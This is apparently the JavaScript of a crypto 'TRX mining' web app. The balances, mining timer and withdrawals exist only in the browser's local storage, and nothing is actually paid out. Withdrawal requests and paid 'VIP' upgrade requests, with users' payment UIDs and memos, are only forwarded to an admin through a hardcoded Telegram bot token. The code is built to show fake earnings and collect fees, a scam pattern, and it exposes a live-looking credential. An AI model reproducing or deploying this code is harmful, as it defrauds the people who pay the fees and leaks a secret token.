const TELEGRAM_BOT_TOKEN = "7659505060:AAFmwIDn2OgrtNoemPpmBWaxsIfdsQdZGCI";
const ADMIN_CHAT_ID = "7417215529";

const TRX_PRICE_USDT = 0.002;
const REWARD_TRX = 5;
const MINING_DURATION_MS = 2 * 60 * 60 * 1000; // 2 hours
const VIP_FEE_USDT = 0.10;
const VIP2_FEE_USDT = 0.20;

function getState(k,d){ try{ const v=localStorage.getItem(k);return v?JSON.parse(v):d;}catch(e){return d;} }
function setState(k,v){ localStorage.setItem(k,JSON.stringify(v)); }

let state = getState("trx_app_v2",{
  trx:20,usdt:0.04,teamCount:0,refId:null,
  miningActive:false,miningEnd:null,isVIP:false,vipType:null
});

const pages = {mine:document.getElementById("page-mine"),team:document.getElementById("page-team"),me:document.getElementById("page-me"),vip:document.getElementById("page-vip")};
const navBtns = document.querySelectorAll(".nav-btn");

navBtns.forEach(btn=>{
  btn.onclick=()=>{
    navBtns.forEach(b=>b.classList.remove("active"));
    btn.classList.add("active");
    Object.values(pages).forEach(p=>p.classList.remove("active"));
    document.getElementById(btn.dataset.target).classList.add("active");
  }
});

const trxAmountEl=document.getElementById("trxAmount");
const progressInner=document.getElementById("progressInner");
const progressTimer=document.getElementById("progressTimer");
const mineActionBtn=document.getElementById("mineActionBtn");
const mineStatus=document.getElementById("mineStatus");
const mineMessage=document.getElementById("mineMessage");

let miningInterval=null;
function render(){
  trxAmountEl.innerText=state.trx.toFixed(2);
  setState("trx_app_v2",state);
}
function updateMiningUI(){
  if(state.miningActive&&state.miningEnd){
    const remaining=state.miningEnd-Date.now();
    if(remaining<=0){
      progressInner.style.width="100%";
      progressTimer.innerText="Ready to collect";
      mineActionBtn.innerText="Collect Reward";
      mineActionBtn.disabled=false;
      mineActionBtn.onclick=collectReward;
      mineStatus.innerText="Completed";
      if(miningInterval){clearInterval(miningInterval);miningInterval=null;}
    }else{
      const pct=((MINING_DURATION_MS-remaining)/MINING_DURATION_MS)*100;
      progressInner.style.width=pct+"%";
      const hrs=Math.floor(remaining/(1000*60*60));
      const mins=Math.floor((remaining%(1000*60*60))/(1000*60));
      progressTimer.innerText=`Time: ${hrs}h ${mins}m`;
      mineActionBtn.innerText="Mining...";
      mineActionBtn.disabled=true;
      mineStatus.innerText="Mining";
      if(!miningInterval) miningInterval=setInterval(updateMiningUI,1000);
    }
  }else{
    progressInner.style.width="0%";
    progressTimer.innerText="Not started";
    mineActionBtn.innerText="Start Mining";
    mineActionBtn.disabled=false;
    mineStatus.innerText="Idle";
    mineActionBtn.onclick=startMining;
  }
}
function startMining(){
  if(state.miningActive)return;
  state.miningActive=true;
  state.miningEnd=Date.now()+MINING_DURATION_MS;
  mineMessage.innerText="Mining started...";
  setState("trx_app_v2",state);
  updateMiningUI();
}
function collectReward(){
  state.miningActive=false;
  state.miningEnd=null;
  state.trx+=REWARD_TRX;
  mineMessage.innerText=`Collected ${REWARD_TRX} TRX!`;
  sendTelegram(`⛏️ Mining Reward: ${REWARD_TRX} TRX`);
  render();updateMiningUI();
}

// Convert TRX→USDT
document.getElementById("convertDo").onclick=()=>{
  const v=parseFloat(document.getElementById("convertInput").value||0);
  if(!v||v<=0||v>state.trx){alert("Invalid amount");return;}
  const converted=v*TRX_PRICE_USDT;
  state.trx-=v;state.usdt+=converted;
  document.getElementById("convertResult").innerText=`Converted ${v} TRX → ${converted.toFixed(6)} USDT`;
  sendTelegram(`🔁 Convert: ${v} TRX → ${converted.toFixed(6)} USDT`);
  render();
};

// Withdraw
document.getElementById("submitWithdraw").onclick=()=>{
  const method=document.getElementById("withdrawMethod").value;
  const uid=document.getElementById("withdrawUID").value.trim();
  const amt=parseFloat(document.getElementById("withdrawAmount").value||0);
  if(!uid||!amt||amt<=0||amt>state.usdt){alert("Invalid input");return;}
  state.usdt-=amt;
  document.getElementById("withdrawMsg").innerText=`Withdraw ${amt} USDT to ${method} (${uid})`;
  sendTelegram(`💸 Withdraw → ${method}\nUID: ${uid}\nAmount: ${amt} USDT`);
  render();
};

// VIP
const vip1Btn=document.getElementById("vip1Btn");
const vip2Btn=document.getElementById("vip2Btn");
const vipFormCard=document.getElementById("vipFormCard");
vip1Btn.onclick=()=>{state.vipType=1;vipFormCard.classList.remove("hidden");};
vip2Btn.onclick=()=>{state.vipType=2;vipFormCard.classList.remove("hidden");};
document.getElementById("vipSubmit").onclick=()=>{
  const uid=document.getElementById("vipSenderUID").value.trim();
  const memo=document.getElementById("vipMemo").value.trim();
  if(!uid||!memo){alert("Enter UID & memo");return;}
  const fee=state.vipType===1?VIP_FEE_USDT:VIP2_FEE_USDT;
  document.getElementById("vipMsg").innerText=`VIP${state.vipType} request sent for ${fee} USDT.`;
  sendTelegram(`🌟 VIP${state.vipType} Request\nUID:${uid}\nMemo:${memo}\nFee:${fee} USDT`);
  setState("trx_app_v2",state);
};

function sendTelegram(msg){
  if(!TELEGRAM_BOT_TOKEN||!ADMIN_CHAT_ID)return;
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
    method:"POST",headers:{"Content-Type":"application/json"},
    body:JSON.stringify({chat_id:ADMIN_CHAT_ID,text:msg})
  });
}

(function init(){
  if(!state.refId) state.refId=Math.random().toString(36).slice(2,9);
  render();
  updateMiningUI();
})();
